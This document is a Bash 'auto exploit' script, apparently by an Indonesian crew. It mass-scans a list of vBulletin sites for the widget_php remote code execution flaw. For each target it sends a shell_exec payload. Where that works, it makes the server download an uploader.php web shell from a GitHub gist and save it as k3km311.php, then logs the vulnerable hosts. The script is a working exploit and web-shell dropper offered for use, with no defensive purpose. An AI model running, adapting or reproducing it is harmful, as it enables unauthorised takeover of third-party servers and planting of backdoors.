#!/bin/bash
# auto exploit 
# zsecc0de-crew-id ~ widhisec
GREEN=$(tput setaf 2) #HIJAU
WHITE=$(tput setaf 7) #PUTIH
CYAN=$(tput setaf 6)
RED=$(tput setaf 1) #MERAH
NORMAL=$(tput sgr0)
function banner(){
	echo -e "
[===============================] 
 ___________
< vBulletin >
 -----------
 \     
  \            -> ${CYAN}(c) zsecc0de-crew-id
   \ >()_
      (__)__ _ $RED
[===============================]
	"
}
function bababa(){ 
#en=$(echo $x | sed -f urlencode)
#  chekweb=$(curl -s "http://tools.seobook.com/server-header-checker/?url=$en&useragent=8&protocol=11" |  grep -c "HTTP/1.1 200 OK")
    shellname=k3km311.php
                    gase=$(curl -m 5 -kLs "${x}" --data "routestring=ajax/render/widget_php&widgetConfig[code]=echo shell_exec('echo wiwi');")
             #grab=$(echo "$gase"| sed 's/\\r//g' | 
                #sed 's/\\t//g' | 
                     #   sed 's/\\n//g' | 
                     #       sed 's/\\//g' | 
                     #               grep -Po 'class="widget-header-divider" />\K.*?<' | 
                    #tr -d '<')
                    gassx=$(curl -m 5 -kLs "${x}" --request POST --data "routestring=ajax/render/widget_php&widgetConfig[code]=echo shell_exec("curl https://gist.githubusercontent.com/widhisec/98a2d7e5c36d6ad88df14dd6ec08da05/raw/3a71897f3e6967dcc50ad98edff37664883d0e73/uploader.php -o "$shellname""); exit;" --output /dev/null -w "%{http_code}")
            if [[ $gase == "wiwi" ]]; then
                  printf "[OK]\n"
            elif [[ $gassx =~ "500" ]]; then
                  printf "${WHITE}[VULN] ~ ${GREEN}$x\n"
                  printf "$x\n" >>  VULNS.txt
            else
                  printf "${WHITE}[NOTT VULN] ~ ${RED}$x \n"
              fi
          

}
banner
echo -ne ${NORMAL}"list > "; read lst
if [[ ! -e $lst ]]; then
	printf "^file kosong .\n"
	exit 
fi
LIMITATOR=15
for x in $(cat $lst); do
	 ((thread=thread%LIMITATOR)); ((thread++==0)) && wait
     bababa "$x" "$lst" &
done
wait
echo -e "${WHITE}total vuln : "$(wc -l VULNS.txt)